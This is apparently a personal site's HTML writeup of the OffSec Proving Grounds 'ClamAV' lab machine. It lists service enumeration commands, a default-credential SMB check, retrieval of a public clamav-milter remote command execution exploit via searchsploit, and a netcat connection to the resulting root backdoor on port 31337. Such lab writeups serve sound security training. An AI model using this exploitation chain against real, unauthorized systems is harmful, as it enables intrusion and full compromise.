@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds ClamAV Writeup - Rachel Murphy" />
+  <title>PG: ClamAV | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+    .meta { color: #cbd5e1; font-size: 0.95rem; margin-bottom: .5rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="wrap">
+      <h1>ClamAV — Writeup</h1>
+      <p class="meta">Proving Grounds — Linux / Remote Exploitation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Easy</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> The “ClamAV” VM is a retired Linux box on OffSec’s Proving Grounds Practice platform. It’s designed to practice version enumeration and remote code execution using a real-world outdated vulnerability. The main exploit path involves an older ClamAV-milter package in Sendmail, which can be abused to obtain a root shell.</p>
+
+      <h3>Key Features</h3>
+      <ul>
+        <li>Reconnaissance of multiple network services (SMTP, HTTP, SMB).</li>
+        <li>Researching and applying a known RCE exploit for clamav-milter &lt; 0.91.2.</li>
+        <li>Achieving root shell through a backdoor port opened by the exploit.</li>
+      </ul>
+    </section>
+
+    <!-- Recon -->
+    <section>
+      <h2>Initial Reconnaissance</h2>
+      <p>Basic scan:</p>
+      <div class="code-block">
+        <pre>sudo nmap -sC -sV 192.168.247.42 -oN nmap-clamav</pre>
+      </div>
+      <img src="../images/Pasted image 20250704122033.png" alt="Nmap scan" class="screenshot">
+      <p>All ports:</p>
+      <img src="../images/Pasted image 20250704122141.png" alt="All ports" class="screenshot">
+
+      <p>Targeted scan of port 60000:</p>
+      <div class="code-block">
+        <pre>sudo nmap -p 60000 -sV -sC 192.168.247.42 -oN nmap-60000</pre>
+      </div>
+      <img src="../images/Pasted image 20250704122728.png" alt="Port 60000 scan" class="screenshot">
+    </section>
+
+    <!-- Web -->
+    <section>
+      <h2>Web Enumeration</h2>
+      <img src="../images/Pasted image 20250704122354.png" alt="Website" class="screenshot">
+
+      <h3>Gobuster</h3>
+      <div class="code-block">
+        <pre>gobuster dir -u http://192.168.247.42/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -o gobust.out</pre>
+      </div>
+      <img src="../images/Pasted image 20250704122632.png" alt="Gobuster results" class="screenshot">
+      <img src="../images/Pasted image 20250704122654.png" alt="Gobuster nothing" class="screenshot">
+    </section>
+
+    <!-- SMB -->
+    <section>
+      <h2>SMB Enumeration</h2>
+      <div class="code-block">
+<pre>nxc smb 192.168.247.42 -u 'admin' -p 'admin' --shares</pre>
+      </div>
+      <img src="../images/Pasted image 20250704122842.png" alt="SMB shares" class="screenshot">
+
+      <p>Attempted smbclient access:</p>
+      <div class="code-block">
+<pre>smbclient -U root -L //192.168.247.42/print$
+smbclient -U postmaster -L //192.168.247.42/print$</pre>
+      </div>
+    </section>
+
+    <!-- SMTP -->
+    <section>
+      <h2>SMTP Enumeration</h2>
+      <p>Sendmail 8.13.4/Debian-3sarge3 running on port 25:</p>
+      <div class="code-block">
+        <pre>telnet 192.168.247.42 25</pre>
+      </div>
+      <img src="../images/Pasted image 20250704124036.png" alt="SMTP connection" class="screenshot">
+
+      <p>Enumerated usernames with smtp-user-enum:</p>
+      <div class="code-block">
+<pre>smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.247.42</pre>
+      </div>
+      <img src="../images/Pasted image 20250704124923.png" alt="SMTP enum results" class="screenshot">
+    </section>
+
+    <!-- Enum4linux & SNMP -->
+    <section>
+      <h2>Further Enumeration</h2>
+      <p>Enumerated with enum4linux:</p>
+      <div class="code-block">
+        <pre>enum4linux -U 192.168.247.42</pre>
+      </div>
+      <img src="../images/Pasted image 20250704125649.png" alt="Enum4linux" class="screenshot">
+
+      <p>Checked SNMP multiplexer:</p>
+      <div class="code-block">
+        <pre>snmp-check 192.168.247.42 -c public</pre>
+      </div>
+    </section>
+
+    <!-- Exploitation -->
+    <section>
+      <h2>Exploitation: ClamAV-milter RCE</h2>
+      <p>Researching exploits for Sendmail with clamav-milter &lt; 0.91.2 led to a public remote command execution exploit:</p>
+      <div class="code-block">
+        <pre>searchsploit -m multiple/remote/4761.pl</pre>
+      </div>
+      <img src="../images/Pasted image 20250704140754.png" alt="Searchsploit clamav-milter" class="screenshot">
+
+      <p>Exploit opens a backdoor on port 31337. Verified with nmap:</p>
+      <div class="code-block">
+        <pre>nmap -p 31337 192.168.247.42</pre>
+      </div>
+      <img src="../images/Pasted image 20250704140936.png" alt="Backdoor port" class="screenshot">
+
+      <p>Connected with netcat to get a root shell:</p>
+      <div class="code-block">
+        <pre>nc 192.168.247.42 31337</pre>
+      </div>
+      <img src="../images/Pasted image 20250704141327.png" alt="Root shell" class="screenshot">
+    </section>
+
+    <section>
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li>Identify and enumerate service versions (Sendmail + clamav-milter).</li>
+        <li>Use <code>searchsploit</code> to quickly find public exploits.</li>
+        <li>Understand how exploits open new access points/backdoors for root shells.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>
+    <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a></p>
+    <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
+  </footer>
+
+</body>
+</html>
